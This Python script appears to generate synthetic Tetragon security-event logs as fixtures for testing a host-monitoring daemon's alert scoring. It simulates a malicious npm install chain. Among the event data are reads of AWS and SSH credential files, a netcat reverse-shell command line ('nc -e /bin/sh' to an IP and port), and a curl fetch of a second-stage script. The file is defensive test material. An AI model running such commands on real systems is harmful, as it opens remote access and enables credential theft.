#!/usr/bin/env python3
"""Synthetic Tetragon JSON export for the wire-fixture capture.

Not a mock of the daemon: every line here is the shape Tetragon v1.7.1 really
writes (docs/TETRAGON-NOTES.md), and the daemon that reads it is the real one.
What is synthetic is the *machine* — a fake home, fake pids, fake package
installs — so that the capture is reproducible and needs no root, no eBPF and
no live Tetragon.

The scenarios, in the order docs/INTEGRATION.md walks through them:

  phase 1  a cloud-credential read from an INTERACTIVE chain   (BASELINE 2b: medium)
           the same read from a PKG-INSTALL chain              (BASELINE 2b: critical)
           an interpreter spawn inside the install             (userland, low)
           an SSH key read that the kernel killed              (CONTRACT 3: the kill is
                                                                confirmed from process_exit)
           netcat inside the install                           (userland, critical)
           the package root exits                              (LEARNING 3: receipt)
           a shell-rc write by an OFFICIAL binary             (BASELINE 2b: service
                                                                context downgrades nothing)
           four desktop-entry writes by the same binary       (BASELINE 1/2: provenance
                                                                downgrade, and a learned entry)
           a burst of low alerts from one rule                  (BASELINE 4: noise guard)
  phase 2  four plugin-dir writes by the same official binary  (BASELINE 3: a proposal,
                                                                after `baseline relearn`)

Usage: gen-export-log.py --phase 1|2 --home DIR --live-pid N --pid-base N
"""

import argparse
import json
import sys
import time

# The whole scenario is squeezed into the minute before the capture: the
# daemon stamps receipts and rarity from the wall clock, so a scenario spread
# over the notional 15 minutes of its own timestamps would report an install
# that took a quarter of an hour.
EPOCH = time.time() - 40.0
SCALE = 0.15


def ts(offset):
    """RFC3339 with nanoseconds, the way Tetragon writes it."""
    t = EPOCH + offset * SCALE
    return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(t)) + ".%09dZ" % int((t % 1) * 1e9)


class Machine:
    def __init__(self, home, pid_base, live_pid):
        self.home = home
        self.pid_base = pid_base
        self.live_pid = live_pid
        self.procs = {}
        self.lines = []

    # -- processes ---------------------------------------------------------
    def exec_(self, key, binary, args="", parent=None, cwd=None, pid=None, at=0.0):
        pid = pid if pid is not None else self.pid_base + len(self.procs) + 1
        p = {
            "exec_id": key,
            "pid": pid,
            "tid": pid,
            "uid": 1000,
            "cwd": cwd or self.home,
            "binary": binary,
            "arguments": args,
            "flags": "execve clone",
            "start_time": ts(at),
            "auid": 1000,
        }
        if parent:
            p["parent_exec_id"] = parent
        self.procs[key] = p
        ev = {"process_exec": {"process": p}}
        if parent:
            ev["process_exec"]["parent"] = self.procs[parent]
        self.emit(ev, at)
        return key

    def exit_(self, key, status=0, signal=None, at=0.0):
        inner = {"process": self.procs[key], "status": status, "time": ts(at)}
        if signal:
            inner["signal"] = signal
        self.emit({"process_exit": inner}, at)

    # -- policy events -----------------------------------------------------
    def file_event(self, key, policy, path, mask, message, at=0.0, kind="process_lsm",
                   action="KPROBE_ACTION_POST"):
        body = {
            "process": self.procs[key],
            "function_name": "file_post_open",
            "policy_name": policy,
            "message": message,
            "args": [
                {"file_arg": {"path": path, "permission": "-rw-------"}},
                {"int_arg": mask},
            ],
            "action": action,
        }
        parent = self.procs[key].get("parent_exec_id")
        if parent:
            body["parent"] = self.procs[parent]
        self.emit({kind: body}, at)

    def emit(self, ev, at):
        ev["node_name"] = "moattest"
        ev["time"] = ts(at + 0.0002)
        self.lines.append(json.dumps(ev, separators=(",", ":")))


def phase1(m):
    h = m.home
    # ---- the machine's furniture -----------------------------------------
    m.exec_("p-term", "/usr/bin/alacritty", "", at=0)
    m.exec_("p-systemd", "/usr/lib/systemd/systemd", "--user", pid=m.pid_base + 900, at=0)

    # ---- (1) a cloud-credential read from an interactive chain ------------
    # BASELINE 2b row "cred-cloud-read": interactive -> medium. This is the
    # developer running their own CDK/boto script from a terminal.
    m.exec_("p-fish-a", "/usr/bin/fish", "", parent="p-term", at=5)
    m.exec_(
        "p-node-a",
        "/usr/bin/node",
        f"{h}/Projects/infra/deploy.mjs",
        parent="p-fish-a",
        cwd=f"{h}/Projects/infra",
        at=10,
    )
    m.file_event(
        "p-node-a",
        "moat-cred-cloud-credentials-read",
        f"{h}/.aws/config",
        4,
        "Cloud or cluster credential file opened for reading",
        at=11,
    )

    # The same process reads the same file again inside the 60 s dedupe window:
    # CONTRACT 6.3 says that is a `count` update on the first alert, not a
    # second alert, and the update carries the newer `ts`.
    m.file_event(
        "p-node-a",
        "moat-cred-cloud-credentials-read",
        f"{h}/.aws/config",
        4,
        "Cloud or cluster credential file opened for reading",
        at=14,
    )

    # ---- (2) the SAME read from a package install -------------------------
    # npm is a node script, so the kernel only ever sees `node .../npm-cli.js`
    # -- the exact case the kernel-side pkg family could not express. Same
    # rule, same actor binary, same directory: only the context differs.
    # (A *different file* in ~/.aws, because the 60 s dedupe window keys on
    # rule+exe+file and would otherwise fold the two reads into one alert --
    # which is itself the right behaviour, just not what we are showing here.)
    m.exec_("p-fish-b", "/usr/bin/fish", "", parent="p-term", at=20)
    m.exec_(
        "p-npm",
        "/usr/bin/node",
        "/usr/lib/node_modules/npm/bin/npm-cli.js install",
        parent="p-fish-b",
        cwd=f"{h}/proj",
        at=25,
    )
    # (2a) an interpreter spawned by the install: userland pkg rule, low.
    m.exec_(
        "p-sh-b",
        "/usr/bin/sh",
        '-c "node node_modules/evil/setup.mjs"',
        parent="p-npm",
        cwd=f"{h}/proj",
        at=26,
    )
    # The acting process is given the harness's live pid so the incident
    # snapshot (LEARNING 4) reads a real /proc.
    m.exec_(
        "p-node-b",
        "/usr/bin/node",
        f"{h}/proj/node_modules/evil/setup.mjs",
        parent="p-sh-b",
        cwd=f"{h}/proj",
        pid=m.live_pid,
        at=27,
    )
    m.file_event(
        "p-node-b",
        "moat-cred-cloud-credentials-read",
        f"{h}/.aws/credentials",
        4,
        "Cloud or cluster credential file opened for reading",
        at=28,
    )
    # (2a') a second postinstall script reads a private SSH key. That policy
    # carries matchActions Sigkill, so the event reports
    # KPROBE_ACTION_SIGKILL -- which in monitor mode means nothing on its own.
    # CONTRACT 3: a kill is only recorded once the matching process_exit says
    # SIGKILL, which is the next event here.
    m.exec_(
        "p-node-c",
        "/usr/bin/node",
        f"{h}/proj/node_modules/evil/steal.mjs",
        parent="p-sh-b",
        cwd=f"{h}/proj",
        at=29,
    )
    m.file_event(
        "p-node-c",
        "moat-cred-ssh-private-key-read",
        f"{h}/.ssh/id_ed25519",
        4,
        "SSH private key opened for reading",
        at=29.5,
        action="KPROBE_ACTION_SIGKILL",
    )
    m.exit_("p-node-c", status=0, signal="SIGKILL", at=29.8)

    # (2b) netcat under the package root: userland rule, critical, never lowered.
    m.exec_(
        "p-nc",
        "/usr/bin/nc",
        "-e /bin/sh 185.220.101.55 4444",
        parent="p-sh-b",
        cwd=f"{h}/proj",
        at=30,
    )
    # (2b') curl inside the install: the userland `downloader` rule (high), and
    # the connection it opens, which the kernel `net` policy reports at medium
    # and the daemon raises because the process is in a package subtree. Both
    # land in the receipt's `network` list.
    m.exec_(
        "p-curl",
        "/usr/bin/curl",
        "-fsSL http://185.220.101.55:8080/stage2.sh",
        parent="p-sh-b",
        cwd=f"{h}/proj",
        at=31,
    )
    m.emit(
        {
            "process_kprobe": {
                "process": m.procs["p-curl"],
                "parent": m.procs["p-sh-b"],
                "function_name": "tcp_connect",
                "policy_name": "moat-net-suspicious-port-egress",
                "message": "Connection to an unusual port",
                "args": [
                    {
                        "sock_arg": {
                            "family": "AF_INET",
                            "type": "SOCK_STREAM",
                            "protocol": "IPPROTO_TCP",
                            "saddr": "192.168.1.20",
                            "daddr": "185.220.101.55",
                            "sport": 51234,
                            "dport": 8080,
                            "state": "TCP_SYN_SENT",
                        }
                    }
                ],
                "action": "KPROBE_ACTION_POST",
            }
        },
        31.5,
    )

    # (2c) the package root exits -> the install receipt (LEARNING 3).
    m.exit_("p-curl", status=0, at=32)
    m.exit_("p-nc", status=0, at=32)
    m.exit_("p-sh-b", status=0, at=33)
    m.exit_("p-npm", status=0, at=34)

    # ---- (3) persistence writes by an OFFICIAL binary ---------------------
    # restic is owned by `extra` in the fixture pacman database, so provenance
    # resolves to official.
    m.exec_("p-restic", "/usr/bin/restic", "backup /home/moattest", parent="p-systemd", at=40)

    # (3a) a shell rc write. BASELINE 2 would take a step off the persist
    # family for an official actor, but the 2b matrix row "persist-user-startup"
    # scores `service` at high and the matrix is absolute -- "service context
    # downgrades nothing; it is where persistence lives". So this stays high.
    m.file_event(
        "p-restic",
        "moat-persist-shell-rc-write",
        f"{h}/.bashrc",
        2,
        "Shell startup file opened for writing",
        at=41,
    )

    # (3b) a desktop-entry write, which no matrix row claims, so the provenance
    # downgrade is the only thing acting: medium -> low, "actor is official
    # (package restic 0.18.1-1)". Four of them in one directory also make the
    # tuple `common` (LEARNING 1) and give it a day (BASELINE 3), which is what
    # the learning window needs before it will learn anything.
    for i, name in enumerate(["restored-a", "restored-b", "restored-c", "restored-d"]):
        m.file_event(
            "p-restic",
            "moat-persist-desktop-entry-write",
            f"{h}/.local/share/applications/{name}.desktop",
            2,
            "Desktop entry opened for writing",
            at=44 + i * 3,
        )

    # ---- (4) one rule floods: the noise guard (BASELINE 4) ----------------
    # Seven low alerts from one rule inside the rolling 24 h window, above the
    # capture's noisy_rule_per_day of 5 (the shipped default is 20; the guard
    # is the same code path at either threshold and 21 alerts would triple the
    # size of the fixtures).
    for i in range(7):
        m.file_event(
            "p-node-a",
            "moat-persist-omarchy-menu-extension-write",
            f"{h}/.config/omarchy/extensions/gen-{i:02d}.sh",
            2,
            "Omarchy menu extension opened for writing",
            at=60 + i * 0.2,
        )


def phase2(m):
    h = m.home
    # After `moatctl baseline relearn --days 0` the learning window is closed,
    # so the same shape that produced a learned entry in phase 1 now has to
    # produce a PROPOSAL instead (BASELINE 3).
    m.exec_("p-systemd", "/usr/lib/systemd/systemd", "--user", pid=m.pid_base + 900, at=0)
    m.exec_("p-restic2", "/usr/bin/restic", "backup /home/moattest", parent="p-systemd", at=200)
    for i, name in enumerate(["a", "b", "c", "d"]):
        m.file_event(
            "p-restic2",
            "moat-persist-omarchy-plugin-write",
            f"{h}/.config/omarchy/plugins/backup-restore/{name}.qml",
            2,
            "Omarchy shell plugin file opened for writing",
            at=201 + i * 3,
        )


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--phase", type=int, required=True)
    ap.add_argument("--home", required=True)
    ap.add_argument("--live-pid", type=int, required=True)
    ap.add_argument("--pid-base", type=int, required=True)
    a = ap.parse_args()

    m = Machine(a.home, a.pid_base, a.live_pid)
    (phase1 if a.phase == 1 else phase2)(m)
    sys.stdout.write("\n".join(m.lines) + "\n")


if __name__ == "__main__":
    main()
